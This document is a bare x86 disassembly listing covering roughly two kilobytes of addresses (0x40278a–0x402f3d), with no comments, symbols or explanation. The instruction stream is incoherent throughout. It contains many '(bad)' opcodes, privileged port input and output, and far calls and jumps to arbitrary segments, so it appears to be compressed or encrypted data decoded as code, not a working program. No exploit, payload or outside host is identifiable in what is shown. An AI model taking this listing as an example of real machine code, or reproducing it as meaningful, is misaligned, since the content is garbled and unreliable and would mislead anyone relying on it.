  40278a:	pop    ebp
  40278b:	jl     0x4027de
  40278d:	inc    ecx
  40278e:	sbb    ebp,DWORD PTR [ecx]
  402790:	ret    0xc123
  402793:	xchg   ecx,eax
  402794:	jl     0x40275a
  402796:	dec    esp
  402797:	xchg   ebp,eax
  402798:	pop    es
  402799:	and    eax,0x34950c7
  40279e:	in     al,0xbb
  4027a0:	mov    esi,0x567cbab
  4027a5:	dec    esp
  4027a6:	repz fwait
  4027a8:	mov    WORD PTR [esi+0x50],ds
  4027ab:	mov    esi,DWORD PTR [edi]
  4027ad:	cwde   
  4027ae:	sar    BYTE PTR [ebp+0x1a3a37a9],cl
  4027b4:	sbb    BYTE PTR [ebx],ch
  4027b6:	mov    ecx,0xbcce6046
  4027bb:	jbe    0x40281d
  4027bd:	out    0x32,al
  4027bf:	aad    0x3e
  4027c1:	mov    edi,0x8b4b6f40
  4027c6:	xor    al,0x37
  4027c8:	add    BYTE PTR [eax-0x385c89f6],cl
  4027ce:	sar    DWORD PTR [esi+ebx*4],0x12
  4027d2:	xor    cl,BYTE PTR ds:0x5975b484
  4027d8:	in     al,dx
  4027d9:	fcmovb st,st(7)
  4027db:	push   esp
  4027dc:	adc    BYTE PTR [edx+0x20],ah
  4027df:	xchg   ebp,eax
  4027e0:	pop    esi
  4027e1:	jae    0x402843
  4027e3:	cli    
  4027e4:	cwde   
  4027e5:	fcmove st,st(3)
  4027e7:	mov    ecx,edx
  4027e9:	or     DWORD PTR [edi+0x62],ebx
  4027ec:	pop    es
  4027ed:	add    esi,esi
  4027ef:	inc    ebp
  4027f0:	retf   
  4027f1:	cmp    cl,bh
  4027f3:	xlat   BYTE PTR ds:[ebx]
  4027f4:	xchg   esi,eax
  4027f5:	xchg   esp,eax
  4027f6:	or     eax,0x6794d97f
  4027fb:	call   0x26a22ca8
  402800:	mov    esp,0x829eeec6
  402805:	sbb    DWORD PTR [ecx-0x47],esp
  402808:	inc    esp
  402809:	push   edx
  40280a:	xor    ecx,ecx
  40280c:	add    DWORD PTR [edi+0x5541cec3],esp
  402812:	(bad)  
  402813:	or     al,0x3f
  402815:	aad    0xda
  402817:	je     0x40285e
  402819:	ficomp WORD PTR [ebx]
  40281b:	sub    eax,0x30ab0c7
  402820:	pop    ebx
  402821:	popa   
  402822:	add    DWORD PTR [eax-0x41],0xffffff87
  402826:	sar    DWORD PTR [eax],1
  402828:	mov    ds,WORD PTR [edi+0x5db1979]
  40282e:	mov    bh,0xa1
  402830:	push   cs
  402831:	fidivr DWORD PTR [esi-0x3b]
  402834:	xor    eax,0x8e7f49d9
  402839:	lea    edx,[edi]
  40283b:	bndstx [ebx+0x28ed6c5c],(bad)
  402842:	mov    BYTE PTR [esi-0x52],bh
  402845:	sbb    ecx,DWORD PTR [ebp+0x7c]
  402848:	sbb    BYTE PTR [ecx+0x247389c2],0x91
  40284f:	xchg   esp,eax
  402850:	mov    bl,0xfa
  402852:	popa   
  402853:	or     edx,DWORD PTR [ebx-0x96b4bd7]
  402859:	mov    cl,0x73
  40285b:	push   eax
  40285c:	xchg   esp,eax
  40285d:	cdq    
  40285e:	sbb    esi,DWORD PTR [eax+0x78616d90]
  402864:	jae    0x4028a7
  402866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402867:	pushf  
  402868:	enter  0xc798,0x17
  40286c:	xchg   ebp,eax
  40286d:	test   al,0x2b
  40286f:	idiv   al
  402871:	xor    al,al
  402873:	in     eax,dx
  402874:	pushf  
  402875:	aad    0x13
  402877:	or     DWORD PTR [eax-0x469a5131],edx
  40287d:	adc    DWORD PTR [ebp-0x4f2d1cb8],0x8
  402884:	loope  0x40280a
  402886:	cmp    al,0xef
  402888:	(bad)  
  402889:	dec    esp
  40288a:	cmp    DWORD PTR [eax],esi
  40288c:	aaa    
  40288d:	gs dec edi
  40288f:	inc    ebx
  402890:	int3   
  402891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402892:	dec    esp
  402893:	ins    BYTE PTR es:[edi],dx
  402894:	ins    BYTE PTR es:[edi],dx
  402895:	sub    al,0x46
  402897:	cmp    eax,0x7192a7d4
  40289c:	xor    BYTE PTR [esp+eax*4-0x2359aab1],bh
  4028a3:	xor    eax,0xd8653a69
  4028a8:	or     eax,0xf5bf9bc
  4028ad:	loopne 0x4028eb
  4028af:	fxch   st(5)
  4028b1:	pusha  
  4028b2:	mov    edi,0x76946c1c
  4028b7:	jo     0x40288a
  4028b9:	icebp  
  4028ba:	pop    ebp
  4028bb:	fdivr  st(2),st
  4028bd:	test   al,0x31
  4028bf:	cmp    eax,0x913def3b
  4028c4:	dec    edi
  4028c5:	(bad)  
  4028c6:	mov    ebx,0xbe541bc4
  4028cb:	test   eax,0xb944cf52
  4028d0:	test   DWORD PTR [ecx+esi*2+0x7b],edx
  4028d4:	push   cs
  4028d5:	(bad)  
  4028d6:	aad    0x83
  4028d8:	les    esi,FWORD PTR [edx+ecx*1-0x31]
  4028dc:	aam    0xe4
  4028de:	pusha  
  4028df:	aam    0xb5
  4028e1:	addr16 es je 0x4028ab
  4028e5:	rol    BYTE PTR [ebp+0x2d9b6497],1
  4028eb:	adc    eax,0xfe860e65
  4028f0:	xchg   BYTE PTR [ecx+0x3c],ch
  4028f3:	cmp    BYTE PTR [ebx],ch
  4028f5:	or     ebp,ebp
  4028f7:	(bad)  
  4028f8:	adc    edx,edx
  4028fa:	add    al,0x42
  4028fc:	ds or  eax,0xb0d668d
  402902:	mov    al,0x89
  402904:	pop    esp
  402905:	jle    0x402893
  402907:	mov    edi,0x868e3126
  40290c:	xchg   ebx,eax
  40290d:	pop    ds
  40290e:	ins    DWORD PTR es:[edi],dx
  40290f:	push   edx
  402910:	push   0x4519a7f5
  402915:	pop    esi
  402916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402917:	pop    edi
  402918:	fimul  DWORD PTR [esi]
  40291a:	in     eax,dx
  40291b:	add    DWORD PTR [edx+0x7c],edx
  40291e:	repnz push ecx
  402920:	mov    ebp,0xdd21badf
  402925:	pop    ss
  402926:	lds    edx,FWORD PTR [esi+0x440a728b]
  40292c:	mov    esi,db6
  40292f:	and    BYTE PTR [edi+0x5b33f439],cl
  402935:	call   0x6e761c61
  40293a:	cmp    BYTE PTR [edx+0x67],dl
  40293d:	or     edx,ecx
  40293f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402940:	sub    edi,DWORD PTR [edx+0x5e]
  402943:	aad    0xc0
  402945:	int    0x4a
  402947:	jle    0x4028d0
  402949:	xor    ch,BYTE PTR [ebx+0x2570dddb]
  40294f:	add    eax,0x90f2c0f7
  402954:	push   ecx
  402955:	scas   al,BYTE PTR es:[edi]
  402956:	aam    0x5a
  402958:	test   ecx,edi
  40295a:	lods   eax,DWORD PTR ds:[esi]
  40295b:	adc    BYTE PTR [ecx+0x3288bd25],0x4b
  402962:	ret    
  402963:	sub    ebx,DWORD PTR [ecx+0x114c1abd]
  402969:	stc    
  40296a:	mul    DWORD PTR ds:0x61ce9327
  402970:	lahf   
  402971:	mov    esi,0x9dcb95c2
  402976:	ins    DWORD PTR es:[edi],dx
  402977:	sbb    DWORD PTR [edx+edi*4+0x3f],edi
  40297b:	arpl   WORD PTR [eax+eax*4+0x219a7fc0],bp
  402982:	mov    dl,0x72
  402984:	inc    edi
  402985:	jnp    0x402920
  402987:	dec    edx
  402988:	inc    edx
  402989:	sbb    al,0xf
  40298b:	xchg   ebp,eax
  40298c:	sub    ebx,DWORD PTR [ebp-0x19039c11]
  402992:	arpl   WORD PTR [ebx+0x3a],bx
  402995:	sub    eax,DWORD PTR [ebp+0x467abbb9]
  40299b:	sub    edi,ecx
  40299d:	(bad)  
  40299e:	lea    esp,[esi+eiz*4-0x45108144]
  4029a5:	pushf  
  4029a6:	push   esi
  4029a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029a8:	inc    eax
  4029a9:	inc    edx
  4029aa:	mov    bh,0x52
  4029ac:	shl    DWORD PTR [esi+0x44],1
  4029af:	cmp    bh,BYTE PTR [ebp+eax*2-0x73b030c4]
  4029b6:	sub    BYTE PTR [ecx-0x76],ah
  4029b9:	outs   dx,BYTE PTR ds:[esi]
  4029ba:	jmp    0x40297c
  4029bc:	xchg   ecx,eax
  4029bd:	cwde   
  4029be:	scas   al,BYTE PTR es:[edi]
  4029bf:	adc    al,0x42
  4029c1:	add    DWORD PTR [ecx+0x5ecd30bd],ecx
  4029c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029c8:	neg    BYTE PTR [eax-0x54]
  4029cb:	out    0x1c,eax
  4029cd:	cld    
  4029ce:	cmc    
  4029cf:	ins    DWORD PTR es:[edi],dx
  4029d0:	(bad)  
  4029d1:	not    BYTE PTR [ecx]
  4029d3:	sub    DWORD PTR [esi],edi
  4029d5:	jno    0x402970
  4029d7:	imul   esp,DWORD PTR [edx],0xbfa69edc
  4029dd:	loop   0x402968
  4029df:	add    ecx,edx
  4029e1:	icebp  
  4029e2:	daa    
  4029e3:	outs   dx,DWORD PTR ds:[esi]
  4029e4:	jl     0x402a0a
  4029e6:	mov    esi,0x18c67005
  4029eb:	and    DWORD PTR [ecx],edi
  4029ed:	cmp    al,0x7f
  4029ef:	xor    BYTE PTR [edi],dl
  4029f1:	(bad)  
  4029f2:	repz add al,0xb3
  4029f5:	and    ecx,esi
  4029f7:	stc    
  4029f8:	push   esi
  4029f9:	or     DWORD PTR [edx+ebp*4+0x7d3a9fa4],ebp
  402a00:	push   ss
  402a01:	mov    cl,0x40
  402a03:	jmp    0xb5d7:0x9414c592
  402a0a:	imul   eax,DWORD PTR [ecx-0x1bc89a11],0xb52d4181
  402a14:	je     0x402a44
  402a16:	xor    BYTE PTR [edx],0xa
  402a19:	cmp    dl,BYTE PTR [ecx-0x2]
  402a1c:	test   al,0x25
  402a1e:	nop
  402a1f:	lahf   
  402a20:	rcl    DWORD PTR [edx+0x62],0xca
  402a24:	dec    ebp
  402a25:	popf   
  402a26:	add    DWORD PTR [edi],esp
  402a28:	mov    bl,0x26
  402a2a:	test   DWORD PTR [esi-0x12],ecx
  402a2d:	sub    al,0x99
  402a2f:	rcl    BYTE PTR [ecx-0xd],0x39
  402a33:	sahf   
  402a34:	mov    ah,BYTE PTR [esi+edx*8+0x652553a9]
  402a3b:	dec    ebp
  402a3c:	lods   al,BYTE PTR ds:[esi]
  402a3d:	ret    0x9680
  402a40:	test   eax,0x31a1438f
  402a45:	push   esp
  402a46:	push   esi
  402a47:	sbb    al,0xbb
  402a49:	dec    ebp
  402a4a:	adc    BYTE PTR [eax-0xa41d53b],dl
  402a50:	repz jge 0x402a65
  402a53:	lds    edx,FWORD PTR [esi+0x3732ac3b]
  402a59:	lds    ecx,FWORD PTR [ecx+0x2b]
  402a5c:	loop   0x402a3c
  402a5e:	sub    ebx,esp
  402a60:	xor    BYTE PTR [esi-0x77],ah
  402a63:	add    al,0x94
  402a65:	mov    eax,0x1c011008
  402a6a:	(bad)  
  402a6b:	mov    ebp,0x89e2677c
  402a70:	(bad)  
  402a72:	ret    0x91fc
  402a75:	adc    ch,BYTE PTR [edx]
  402a77:	in     al,0x79
  402a79:	xchg   ebx,eax
  402a7a:	out    dx,al
  402a7b:	test   eax,0xece22ed6
  402a80:	xor    al,BYTE PTR [esi-0x8]
  402a83:	or     bh,BYTE PTR [edi+0x4c2ebdcb]
  402a89:	popf   
  402a8a:	mov    ebp,ebp
  402a8c:	cmp    DWORD PTR [edx+0xe3adf31],0x256530af
  402a96:	add    dl,BYTE PTR [ecx-0x54]
  402a99:	test   BYTE PTR [ebx-0x437e4552],ah
  402a9f:	pop    ecx
  402aa0:	lods   al,BYTE PTR ds:[esi]
  402aa1:	xchg   esi,eax
  402aa2:	cmp    eax,0x8fa0908
  402aa7:	jecxz  0x402ae3
  402aa9:	retf   0xce35
  402aac:	shr    BYTE PTR [eax],cl
  402aae:	jae    0x402a41
  402ab0:	test   al,0x18
  402ab2:	xchg   DWORD PTR [eax],ebx
  402ab4:	mov    eax,ecx
  402ab6:	push   0xffffffd3
  402ab8:	fcomp  st(0)
  402aba:	adc    eax,0x712db8fc
  402abf:	mov    DWORD PTR [edx],ebp
  402ac1:	push   ds
  402ac2:	inc    BYTE PTR [esi]
  402ac4:	jge    0x402afb
  402ac6:	test   al,0x9d
  402ac8:	mov    dl,0xf7
  402aca:	jle    0x402b03
  402acc:	adc    bl,bh
  402ace:	js     0x402aee
  402ad0:	push   0x764e0945
  402ad5:	call   0x8747d481
  402ada:	push   esp
  402adb:	xchg   edx,eax
  402adc:	loopne 0x402b39
  402ade:	cmc    
  402adf:	bound  ebx,QWORD PTR [ecx]
  402ae1:	inc    dl
  402ae3:	adc    DWORD PTR [ecx+0x43],ecx
  402ae6:	addr16 imul edi
  402ae9:	jnp    0x402aea
  402aeb:	inc    eax
  402aec:	add    DWORD PTR [ebp+0x37],ebx
  402aef:	cs (bad) 
  402af1:	ret    0xfe8b
  402af4:	(bad)
  402af7:	xchg   ebx,eax
  402af8:	sbb    esp,DWORD PTR gs:[esp+eax*8-0x78]
  402afd:	and    edx,DWORD PTR [ebx+0x674c5f24]
  402b03:	push   esp
  402b04:	or     eax,0x3ecbf544
  402b09:	mov    bh,0x78
  402b0b:	mov    eax,DWORD PTR [eax+0x1e]
  402b0e:	fld    TBYTE PTR [eax-0x21]
  402b11:	mov    cs,esp
  402b13:	aaa    
  402b14:	cmp    ebp,DWORD PTR [esp+eax*2-0x6ac8e294]
  402b1b:	es mov edx,0x2cbef8a6
  402b21:	push   esp
  402b22:	pop    ebp
  402b23:	jp     0x402b5b
  402b25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b26:	push   esp
  402b27:	out    0xea,eax
  402b29:	in     al,dx
  402b2a:	xor    cl,BYTE PTR [ecx-0x4f]
  402b2d:	(bad)  
  402b2e:	scas   al,BYTE PTR es:[edi]
  402b2f:	je     0x402b8e
  402b31:	into   
  402b32:	out    dx,eax
  402b33:	cwde   
  402b34:	cmp    dl,BYTE PTR [edi+ebp*4+0x1a]
  402b38:	mov    ebx,0xbe37975
  402b3d:	aad    0x90
  402b3f:	imul   eax,DWORD PTR [ebx-0xf],0xd45db387
  402b46:	mov    ebp,0x808d9491
  402b4b:	xchg   BYTE PTR [ebx+edx*2],ah
  402b4e:	cmp    bl,bh
  402b50:	adc    edx,DWORD PTR [ebx]
  402b52:	and    bh,BYTE PTR [edi+0x3093c6e8]
  402b58:	ret    
  402b59:	rcr    DWORD PTR [edi-0x3c4d2a2a],cl
  402b5f:	addr16 retf 
  402b61:	or     eax,DWORD PTR [ecx]
  402b63:	adc    al,0x37
  402b65:	inc    eax
  402b66:	push   edx
  402b67:	gs loop 0x402b97
  402b6a:	addr16 adc al,0x97
  402b6d:	lea    edi,[ebx+0x7582dea6]
  402b73:	repnz sar BYTE PTR [ebx+0x48],cl
  402b77:	fldenv [ebx+0x1b042533]
  402b7d:	lahf   
  402b7e:	mov    edi,0x2d2bdc52
  402b83:	loopne 0x402b1d
  402b85:	dec    edx
  402b86:	gs sbb al,0xbd
  402b89:	push   es
  402b8a:	adc    DWORD PTR [ebx-0x4005022f],esi
  402b90:	push   eax
  402b91:	out    dx,al
  402b92:	sub    al,0x51
  402b94:	into   
  402b95:	xor    BYTE PTR [ebx+0xd90e0de],cl
  402b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b9c:	stc    
  402b9d:	or     BYTE PTR [ebx+0x22],ah
  402ba0:	retf   
  402ba1:	mov    esp,0xabc8079d
  402ba6:	push   edi
  402ba7:	pop    edi
  402ba8:	pop    esi
  402ba9:	loop   0x402c27
  402bab:	adc    dl,BYTE PTR [eax+0x47]
  402bae:	fwait
  402baf:	and    esi,ecx
  402bb1:	jecxz  0x402b4c
  402bb3:	shl    DWORD PTR [edi],cl
  402bb5:	and    esi,DWORD PTR [ebp-0x9aeefe1]
  402bbb:	test   al,0x98
  402bbd:	xchg   esi,eax
  402bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bbf:	js     0x402be5
  402bc1:	mov    WORD PTR [edx],ss
  402bc3:	pop    ds
  402bc4:	pop    esi
  402bc5:	cwde   
  402bc6:	add    DWORD PTR [edi+0x1],esi
  402bc9:	jb     0x402c26
  402bcb:	aam    0xe7
  402bcd:	mov    fs,edi
  402bcf:	fucomp st(0)
  402bd1:	call   0x7ab4:0xce57c253
  402bd8:	mov    ds:0xe5032a47,al
  402bdd:	stos   DWORD PTR es:[edi],eax
  402bde:	adc    esp,DWORD PTR [eax]
  402be0:	xor    dl,ch
  402be2:	(bad)  
  402be3:	in     eax,dx
  402be4:	xor    eax,0x162d20be
  402be9:	loope  0x402c47
  402beb:	mov    DWORD PTR [ecx-0x4046df2e],ecx
  402bf1:	xor    DWORD PTR [ebx],esi
  402bf3:	mov    eax,0x58e6aee4
  402bf8:	and    edx,ebx
  402bfa:	das    
  402bfb:	mov    DWORD PTR [ebx-0x21c579ce],ebp
  402c01:	inc    ebx
  402c02:	lds    ecx,FWORD PTR [edi+edi*4-0x7b048259]
  402c09:	enter  0x905a,0x34
  402c0d:	adc    DWORD PTR [edi],edx
  402c0f:	mov    bl,0x39
  402c11:	sahf   
  402c12:	mov    ecx,0xa48ae5f7
  402c17:	xor    BYTE PTR [edi],al
  402c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c1a:	add    DWORD PTR [esi-0x47f9dd1],edi
  402c20:	jge    0x402c82
  402c22:	out    dx,al
  402c23:	push   edx
  402c24:	outs   dx,BYTE PTR ds:[esi]
  402c25:	push   ebp
  402c26:	add    al,0x2
  402c28:	fstp   DWORD PTR [esp+ecx*1]
  402c2b:	mov    bl,ah
  402c2d:	xchg   DWORD PTR [edx+0x2e343e69],esi
  402c33:	or     al,0xd7
  402c35:	mov    edi,DWORD PTR [ebp+0x177d1194]
  402c3b:	js     0x402c20
  402c3d:	xor    eax,0x857fd4c3
  402c42:	ret    0x7e3f
  402c45:	lods   al,BYTE PTR ds:[esi]
  402c46:	mov    edi,0x54e4f864
  402c4b:	(bad)  
  402c4c:	call   0x3c45f7ff
  402c51:	lods   al,BYTE PTR ds:[esi]
  402c52:	retf   0xa5fe
  402c55:	inc    edi
  402c56:	push   edi
  402c57:	cmp    DWORD PTR [esi+0x1d],edi
  402c5a:	add    bh,BYTE PTR [ebp+0x25]
  402c5d:	call   0xe1f3:0x4f364604
  402c64:	int    0xcc
  402c66:	fnstenv [ebp-0x1d]
  402c69:	inc    esp
  402c6a:	adc    eax,0x9ac41288
  402c6f:	call   0xf90d:0x9e9b773c
  402c76:	(bad)  [ebp+0x790ef2e9]
  402c7c:	jns    0x402c70
  402c7e:	jb     0x402cba
  402c80:	dec    esi
  402c81:	pop    ebp
  402c82:	and    DWORD PTR [ebx+0x15],0xb65e3c2c
  402c89:	(bad)  [eax+0xcd15b7]
  402c8f:	ror    BYTE PTR [ebx-0x6c],0x95
  402c93:	lods   eax,DWORD PTR ds:[esi]
  402c94:	inc    esp
  402c95:	dec    ecx
  402c96:	or     eax,0xbc2f25c9
  402c9b:	xlat   BYTE PTR ds:[ebx]
  402c9c:	bound  edi,QWORD PTR [esi]
  402c9e:	sbb    al,0xaa
  402ca0:	in     eax,dx
  402ca1:	rcl    DWORD PTR [esi],cl
  402ca3:	mov    eax,ds:0xc71d4d28
  402ca8:	mov    al,0x1d
  402caa:	mov    dh,0x33
  402cac:	push   ebp
  402cad:	push   edx
  402cae:	inc    ebx
  402caf:	or     eax,0x9826d892
  402cb4:	cmp    al,0xe2
  402cb6:	scas   eax,DWORD PTR es:[edi]
  402cb7:	stos   DWORD PTR es:[edi],eax
  402cb8:	xchg   ebx,eax
  402cb9:	dec    edx
  402cba:	call   0xf6c2:0xde73b155
  402cc1:	mov    ch,0xb2
  402cc3:	jne    0x402c92
  402cc5:	retf   0x4751
  402cc8:	jae    0x402ce3
  402cca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ccb:	add    BYTE PTR [esi-0x3c],cl
  402cce:	pop    eax
  402ccf:	cwde   
  402cd0:	add    cl,BYTE PTR [eax+0x2f]
  402cd3:	fild   DWORD PTR [ecx]
  402cd5:	sahf   
  402cd6:	jns    0x402ccb
  402cd8:	adc    ebx,esi
  402cda:	adc    al,0x38
  402cdc:	(bad)  
  402cdd:	outs   dx,DWORD PTR ds:[esi]
  402cde:	scas   eax,DWORD PTR es:[edi]
  402cdf:	shr    DWORD PTR [ebx+0xa],cl
  402ce2:	test   BYTE PTR [ebx],dl
  402ce4:	inc    esp
  402ce5:	xchg   esp,eax
  402ce6:	mov    DWORD PTR [ecx-0x4d],edx
  402ce9:	xchg   ecx,eax
  402cea:	iret   
  402ceb:	xchg   ebp,eax
  402cec:	js     0x402cf6
  402cee:	mov    al,ds:0x743360b4
  402cf3:	mov    bh,0x6a
  402cf5:	sub    dh,bl
  402cf7:	out    0xa2,eax
  402cf9:	and    al,0xff
  402cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cfc:	xchg   edi,eax
  402cfd:	test   BYTE PTR ds:0xbaf96e2c,ch
  402d03:	pop    edx
  402d04:	ds ds dec ebx
  402d07:	cmp    BYTE PTR [edx+0x3cf620fb],bl
  402d0d:	dec    DWORD PTR [ebx]
  402d0f:	jno    0x402d0a
  402d11:	jnp    0x402cef
  402d13:	mov    BYTE PTR [eax],bl
  402d15:	or     ebp,DWORD PTR [ecx]
  402d17:	iret   
  402d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d19:	or     ah,BYTE PTR [edi+0x5789416e]
  402d1f:	jp     0x402d47
  402d21:	shr    DWORD PTR [eax-0x49801bc1],1
  402d27:	add    BYTE PTR [edi+0x71acb4d5],dh
  402d2d:	xor    DWORD PTR [ebx-0xc0b5710],0xfffffffd
  402d34:	jmp    0xdd795627
  402d39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d3a:	xchg   BYTE PTR [ecx],bh
  402d3c:	imul   edi,DWORD PTR [edx+esi*1-0x25],0x93993182
  402d44:	int3   
  402d45:	inc    eax
  402d46:	dec    esi
  402d47:	pop    eax
  402d48:	lahf   
  402d49:	xlat   BYTE PTR ds:[ebx]
  402d4a:	cld    
  402d4b:	xor    BYTE PTR [esi],dh
  402d4d:	int    0xc8
  402d4f:	sub    DWORD PTR [esi+ecx*8-0x391fe522],edi
  402d56:	stos   BYTE PTR es:[edi],al
  402d57:	lods   al,BYTE PTR ds:[esi]
  402d58:	outs   dx,DWORD PTR ds:[esi]
  402d59:	cmc    
  402d5a:	clc    
  402d5b:	bound  ebx,QWORD PTR [edx+0x55e9fff7]
  402d61:	sbb    esp,0x3ad587a9
  402d67:	mov    ebp,0xdbeeba5a
  402d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d6d:	test   BYTE PTR [edx],ch
  402d6f:	xchg   DWORD PTR [ebp+0x17],ecx
  402d72:	and    ebx,eax
  402d74:	test   DWORD PTR [ebx],eax
  402d76:	mov    al,0x57
  402d78:	bound  edx,QWORD PTR [eax-0xb]
  402d7b:	adc    ecx,ebx
  402d7d:	jp     0x402d4d
  402d7f:	cli    
  402d80:	rcl    BYTE PTR [edx+ecx*8+0x12],1
  402d84:	pop    edi
  402d85:	loopne 0x402d33
  402d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d88:	jecxz  0x402d9b
  402d8a:	not    BYTE PTR [edi]
  402d8c:	xchg   ebp,eax
  402d8d:	ror    DWORD PTR [edx+0x53c8a655],cl
  402d93:	push   ss
  402d94:	addr16 leave 
  402d96:	lea    ebx,[ebx-0x72e29a93]
  402d9c:	xor    edi,edi
  402d9e:	shr    dl,0x57
  402da1:	cmp    al,0xac
  402da3:	ss es and eax,0x945dbce7
  402daa:	cdq    
  402dab:	cmp    cl,ah
  402dad:	out    0xc1,eax
  402daf:	ins    DWORD PTR es:[edi],dx
  402db0:	xchg   BYTE PTR [eax+eiz*8],dl
  402db3:	and    DWORD PTR [ebp+0x56],esp
  402db6:	fld    TBYTE PTR [esi-0x224cc11]
  402dbc:	call   0x9b32:0x743f58ca
  402dc3:	add    bl,cl
  402dc5:	dec    esi
  402dc6:	into   
  402dc7:	pop    ds
  402dc8:	push   eax
  402dc9:	and    ebp,DWORD PTR [ecx+0x307d10af]
  402dcf:	adc    esp,DWORD PTR [esi+0x663eac43]
  402dd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dd6:	inc    ebx
  402dd7:	rol    esi,cl
  402dd9:	jnp    0x402de6
  402ddb:	mov    eax,0xd82da26e
  402de0:	sbb    BYTE PTR gs:[esi+0x2],0x6c
  402de5:	inc    si
  402de7:	push   cs
  402de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402de9:	cmp    eax,0x481df238
  402dee:	cwde   
  402def:	jmp    0x402e6d
  402df1:	fisubr WORD PTR [eax-0x30]
  402df4:	fld    DWORD PTR [esi-0x281b9ba4]
  402dfa:	sbb    eax,0x67532ac4
  402dff:	test   al,0x50
  402e01:	lods   eax,DWORD PTR ds:[esi]
  402e02:	xor    BYTE PTR [ebp+0x6dd8d863],dl
  402e08:	scas   eax,DWORD PTR es:[edi]
  402e09:	and    al,0x9a
  402e0b:	jne    0x402e19
  402e0d:	psllq  mm2,mm2
  402e10:	mov    DWORD PTR [esi+0x41027427],ebx
  402e16:	mov    ch,0x91
  402e18:	mov    edi,DWORD PTR [edx-0x5b]
  402e1b:	lods   eax,DWORD PTR ds:[esi]
  402e1c:	and    edi,DWORD PTR [ecx+0x6eab1be4]
  402e22:	mov    al,ds:0x7c0a64b7
  402e27:	and    ecx,edi
  402e29:	sbb    edi,DWORD PTR [eax+0x3d]
  402e2c:	stos   DWORD PTR es:[edi],eax
  402e2d:	and    eax,0x58706f27
  402e32:	pxor   mm3,QWORD PTR [ebp-0x6248b8eb]
  402e39:	iret   
  402e3a:	dec    esp
  402e3b:	pop    edi
  402e3c:	mov    DWORD PTR [ebp-0x2],0xa59558f2
  402e43:	xchg   esi,eax
  402e44:	gs aam 0x59
  402e47:	call   0xcda5f5d8
  402e4c:	adc    eax,0x627c178c
  402e51:	ss cwde 
  402e53:	lds    edx,FWORD PTR [edi-0x53563266]
  402e59:	sub    DWORD PTR [edi],esi
  402e5b:	mov    BYTE PTR [ecx],ah
  402e5d:	inc    esp
  402e5e:	cs ja  0x402e98
  402e61:	stc    
  402e62:	xor    DWORD PTR [ecx+0x450602c6],edi
  402e68:	sub    DWORD PTR [eax],0x6c8eb5f1
  402e6e:	call   0x201c694a
  402e73:	int    0x83
  402e75:	and    DWORD PTR [edx-0x3254856b],ebp
  402e7b:	and    DWORD PTR ds:[ebx-0x66bb577c],ecx
  402e82:	sbb    DWORD PTR [ebx],ebx
  402e84:	jle    0x402efa
  402e86:	loope  0x402e66
  402e88:	mov    BYTE PTR [eax+0x2c],cl
  402e8b:	fstp   TBYTE PTR [ebp-0x3b]
  402e8e:	imul   ebx,edx,0xb71f6e77
  402e94:	sbb    eax,DWORD PTR [ecx-0x62]
  402e97:	and    al,0xad
  402e99:	(bad)  
  402e9a:	or     ebp,DWORD PTR [edx+0x13a76b3a]
  402ea0:	adc    eax,0xb19071b6
  402ea6:	jmp    0x178b:0xcc8aae71
  402ead:	xchg   ebx,eax
  402eae:	xor    dh,bh
  402eb0:	popa   
  402eb1:	adc    DWORD PTR [edx+ebp*2-0x3cecb264],0x6b
  402eb9:	pop    esp
  402eba:	or     ecx,DWORD PTR [esi+eax*2]
  402ebd:	pop    es
  402ebe:	sub    esi,edx
  402ec0:	dec    ebx
  402ec1:	pop    ebp
  402ec2:	jns    0x402f31
  402ec4:	aas    
  402ec5:	jnp    0x402e6f
  402ec7:	daa    
  402ec8:	loope  0x402e6c
  402eca:	pop    esi
  402ecb:	scas   eax,DWORD PTR es:[edi]
  402ecc:	retf   
  402ecd:	sub    al,0xc2
  402ecf:	or     BYTE PTR [di],dl
  402ed2:	mov    bl,0x90
  402ed4:	das    
  402ed5:	in     eax,dx
  402ed6:	retf   0xd016
  402ed9:	xchg   BYTE PTR [edx+0x2b],dh
  402edc:	data16 into 
  402ede:	push   ebx
  402edf:	stos   BYTE PTR es:[edi],al
  402ee0:	(bad)  
  402ee1:	sti    
  402ee2:	or     ebp,DWORD PTR [ebx-0x53]
  402ee5:	mov    eax,ds:0x66577eba
  402eea:	in     eax,0xcf
  402eec:	adc    ebp,DWORD PTR [edx+0x1]
  402eef:	xchg   ebp,eax
  402ef0:	jmp    0x5de10c35
  402ef5:	mov    esi,0xea6a5b02
  402efa:	dec    esp
  402efb:	nop
  402efc:	inc    esp
  402efd:	pop    ds
  402efe:	xchg   esi,eax
  402eff:	or     edi,edi
  402f01:	mov    DWORD PTR [edi],ecx
  402f03:	mov    DWORD PTR [edx*8+0x2ba46700],esp
  402f0a:	jnp    0x402f2f
  402f0c:	sbb    bl,BYTE PTR [ecx-0x66]
  402f0f:	mov    edx,es
  402f11:	out    dx,al
  402f12:	es aad 0xe1
  402f15:	sahf   
  402f16:	push   esi
  402f17:	or     ebx,esp
  402f19:	sahf   
  402f1a:	cmc    
  402f1b:	mov    ebp,0x11871072
  402f20:	sub    eax,0x1a5238ab
  402f25:	mov    edx,0xb0a373f2
  402f2a:	cld    
  402f2b:	sti    
  402f2c:	add    DWORD PTR [eax],esi
  402f2e:	jmp    0x8ce15df4
  402f33:	or     al,0xc
  402f35:	cdq    
  402f36:	dec    edi
  402f37:	lahf   
  402f38:	je     0x402f63
  402f3a:	pop    esi
  402f3b:	mov    cl,0x5a
  402f3d:	mov    dh,0xca
